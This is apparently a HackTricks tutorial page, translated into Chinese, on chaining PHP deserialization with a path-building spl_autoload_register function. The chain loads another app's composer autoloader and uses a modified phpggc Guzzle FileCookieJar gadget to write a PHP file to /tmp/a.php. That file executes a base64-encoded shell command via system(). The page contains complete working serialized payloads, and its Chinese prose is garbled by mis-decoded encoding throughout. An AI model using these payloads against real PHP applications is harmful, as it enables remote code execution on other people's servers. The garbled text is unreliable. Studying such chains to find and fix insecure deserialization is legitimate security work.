# PHP - ååºåˆ—åŒ– + è‡ªåŠ¨åŠ è½½ç±»

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

é¦–å…ˆï¼Œä½ åº”è¯¥æŸ¥çœ‹ä»€ä¹ˆæ˜¯[**è‡ªåŠ¨åŠ è½½ç±»**](https://www.php.net/manual/en/language.oop5.autoload.php)ã€‚

## PHP ååºåˆ—åŒ– + spl\_autoload\_register + LFI/Gadget

æˆ‘ä»¬å¤„äºè¿™æ ·ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬åœ¨ä¸€ä¸ª web åº”ç”¨ç¨‹åºä¸­å‘ç°äº†ä¸€ä¸ª**PHP ååºåˆ—åŒ–æ¼æ´**ï¼Œä½†æ˜¯æ²¡æœ‰**`phpggc`**ä¸­çš„æ¼æ´åº“ã€‚ç„¶è€Œï¼Œåœ¨åŒä¸€ä¸ªå®¹å™¨ä¸­ï¼Œæœ‰ä¸€ä¸ª**ä¸åŒçš„ composer web åº”ç”¨ç¨‹åºå…·æœ‰æ¼æ´çš„åº“**ã€‚å› æ­¤ï¼Œç›®æ ‡æ˜¯**åŠ è½½å¦ä¸€ä¸ª web åº”ç”¨ç¨‹åºçš„ composer åŠ è½½å™¨**ï¼Œå¹¶æ»¥ç”¨å®ƒæ¥**åŠ è½½ä¸€ä¸ªå°†åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„åº“çš„ gadget**ã€‚

æ­¥éª¤ï¼š

* ä½ å·²ç»æ‰¾åˆ°äº†ä¸€ä¸ª**ååºåˆ—åŒ–æ¼æ´**ï¼Œå¹¶ä¸”å½“å‰åº”ç”¨ç¨‹åºä»£ç ä¸­**æ²¡æœ‰ä»»ä½• gadget**
* ä½ å¯ä»¥æ»¥ç”¨ä¸€ä¸ªç±»ä¼¼ä¸‹é¢çš„**`spl_autoload_register`**å‡½æ•°æ¥**åŠ è½½ä»»ä½•å…·æœ‰ `.php` æ‰©å±•åçš„æœ¬åœ°æ–‡ä»¶**
* ä¸ºæ­¤ï¼Œä½ ä½¿ç”¨ä¸€ä¸ªååºåˆ—åŒ–ï¼Œå…¶ä¸­ç±»çš„åç§°å°†åœ¨**`$name`**ä¸­ã€‚åœ¨åºåˆ—åŒ–å¯¹è±¡çš„ç±»åä¸­**ä¸èƒ½ä½¿ç”¨ "/" æˆ– "."**ï¼Œä½†æ˜¯**ä»£ç **ä¼šå°†**ä¸‹åˆ’çº¿**("\_")**æ›¿æ¢ä¸ºæ–œæ **("/")ã€‚å› æ­¤ï¼Œç±»åå¦‚`tmp_passwd`å°†è¢«è½¬æ¢ä¸º`/tmp/passwd.php`ï¼Œå¹¶ä¸”ä»£ç å°†å°è¯•åŠ è½½å®ƒã€‚\
ä¸€ä¸ª**gadget ç¤ºä¾‹**å°†æ˜¯ï¼š**`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
å¦‚æœä½ æœ‰ä¸€ä¸ª**æ–‡ä»¶ä¸Šä¼ **åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå¸¦æœ‰**`.php`æ‰©å±•å**çš„æ–‡ä»¶ï¼Œä½ å¯ä»¥ç›´æ¥æ»¥ç”¨è¿™ä¸ªåŠŸèƒ½å¹¶è·å¾—RCEã€‚
{% endhint %}

åœ¨æˆ‘çš„æƒ…å†µä¸‹ï¼Œæˆ‘æ²¡æœ‰è¿™æ ·çš„åŠŸèƒ½ï¼Œä½†æ˜¯åœ¨**åŒä¸€ä¸ªå®¹å™¨**ä¸­æœ‰å¦ä¸€ä¸ªä½¿ç”¨**`phpggc` gadget**çš„composerç½‘é¡µåº“ã€‚

* è¦åŠ è½½è¿™ä¸ªå…¶ä»–åº“ï¼Œé¦–å…ˆä½ éœ€è¦**åŠ è½½é‚£ä¸ªå…¶ä»–webåº”ç”¨çš„composeråŠ è½½å™¨**ï¼ˆå› ä¸ºå½“å‰åº”ç”¨çš„åŠ è½½å™¨æ— æ³•è®¿é—®å…¶ä»–åº”ç”¨çš„åº“ï¼‰ã€‚**çŸ¥é“åº”ç”¨çš„è·¯å¾„**åï¼Œä½ å¯ä»¥å¾ˆå®¹æ˜“åœ°é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š**`O:28:"www_frontend_vendor_autoload":0:{}`**ï¼ˆåœ¨æˆ‘çš„æƒ…å†µä¸‹ï¼ŒcomposeråŠ è½½å™¨ä½äº`/www/frontend/vendor/autoload.php`ï¼‰
* ç°åœ¨ï¼Œä½ å¯ä»¥**åŠ è½½**å…¶ä»–**åº”ç”¨çš„composeråŠ è½½å™¨**ï¼Œæ‰€ä»¥ç°åœ¨æ˜¯**ç”Ÿæˆphpggc payload**çš„æ—¶å€™äº†ã€‚åœ¨æˆ‘çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä½¿ç”¨äº†**`Guzzle/FW1`**ï¼Œå®ƒå…è®¸æˆ‘åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­**å†™å…¥ä»»æ„æ–‡ä»¶**ã€‚
* æ³¨æ„ï¼š**ç”Ÿæˆçš„gadgetæ— æ³•æ­£å¸¸å·¥ä½œ**ï¼Œä¸ºäº†ä½¿å…¶æ­£å¸¸å·¥ä½œï¼Œæˆ‘**ä¿®æ”¹äº†**phpggcçš„**`chain.php`**è´Ÿè½½ï¼Œå¹¶å°†ç±»çš„**æ‰€æœ‰å±æ€§**ä»ç§æœ‰æ”¹ä¸ºå…¬æœ‰ã€‚å¦‚æœä¸è¿™æ ·åšï¼Œåœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²åï¼Œåˆ›å»ºçš„å¯¹è±¡çš„å±æ€§å°†æ²¡æœ‰ä»»ä½•å€¼ã€‚
* ç°åœ¨æˆ‘ä»¬æœ‰äº†**åŠ è½½å…¶ä»–åº”ç”¨çš„composeråŠ è½½å™¨**çš„æ–¹æ³•ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª**å¯ç”¨çš„phpggc payload**ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦åœ¨**åŒä¸€ä¸ªè¯·æ±‚ä¸­æ‰§è¡Œæ­¤æ“ä½œï¼Œä»¥ä¾¿åœ¨ä½¿ç”¨gadgetæ—¶åŠ è½½åŠ è½½å™¨**ã€‚ä¸ºæ­¤ï¼Œæˆ‘å‘é€äº†ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–æ•°ç»„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
* ä½ å¯ä»¥**å…ˆçœ‹åˆ°åŠ è½½å™¨è¢«åŠ è½½ï¼Œç„¶åæ˜¯payload**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
* ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥**åˆ›å»ºå’Œå†™å…¥æ–‡ä»¶**ï¼Œä½†æ˜¯ç”¨æˆ·**æ— æ³•å†™å…¥WebæœåŠ¡å™¨å†…çš„ä»»ä½•æ–‡ä»¶å¤¹**ã€‚å› æ­¤ï¼Œå¦‚æ‚¨åœ¨æœ‰æ•ˆè½½è·ä¸­æ‰€è§ï¼ŒPHPè°ƒç”¨**`system`**å¹¶ä½¿ç”¨ä¸€äº›**base64**åˆ›å»ºåœ¨**`/tmp/a.php`**ä¸­ã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥**é‡ç”¨æˆ‘ä»¬ä¹‹å‰ç”¨äºLFIçš„ç¬¬ä¸€ç§æœ‰æ•ˆè½½è·**ï¼Œæ¥åŠ è½½å…¶ä»–Webåº”ç”¨ç¨‹åºçš„composeråŠ è½½å™¨ï¼Œä»¥åŠ è½½ç”Ÿæˆçš„`/tmp/a.php`æ–‡ä»¶ã€‚åªéœ€å°†å…¶æ·»åŠ åˆ°ååºåˆ—åŒ–å°å·¥å…·ä¸­ï¼š&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**è´Ÿè½½æ‘˜è¦**

* **åŠ è½½åŒä¸€å®¹å™¨ä¸­ä¸åŒ Web åº”ç”¨ç¨‹åºçš„ composer è‡ªåŠ¨åŠ è½½**
* **åŠ è½½ phpggc gadget** ä»¥æ»¥ç”¨å…¶ä»– Web åº”ç”¨ç¨‹åºçš„åº“ï¼ˆæœ€åˆæ˜“å—åºåˆ—åŒ–æ”»å‡»çš„ Web åº”ç”¨ç¨‹åºæ²¡æœ‰ä»»ä½•åº“ä¸­çš„ gadgetï¼‰
* è¯¥ gadget å°†åœ¨ /tmp/a.php ä¸­åˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ¶æ„å‘½ä»¤çš„ PHP è´Ÿè½½æ–‡ä»¶ï¼ˆWeb åº”ç”¨ç¨‹åºç”¨æˆ·æ— æ³•åœ¨ä»»ä½• Web åº”ç”¨ç¨‹åºçš„ä»»ä½•æ–‡ä»¶å¤¹ä¸­å†™å…¥ï¼‰
* è´Ÿè½½çš„æœ€åéƒ¨åˆ†å°†ä½¿ç”¨ **åŠ è½½ç”Ÿæˆçš„ php æ–‡ä»¶** æ¥æ‰§è¡Œå‘½ä»¤

æˆ‘éœ€è¦**è°ƒç”¨è¿™ä¸ªåºåˆ—åŒ–ä¸¤æ¬¡**ã€‚åœ¨æˆ‘çš„æµ‹è¯•ä¸­ï¼Œç¬¬ä¸€æ¬¡åˆ›å»ºäº† `/tmp/a.php` æ–‡ä»¶ï¼Œä½†æ²¡æœ‰åŠ è½½ï¼Œç¬¬äºŒæ¬¡æ­£ç¡®åŠ è½½äº†å®ƒã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ NFT æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
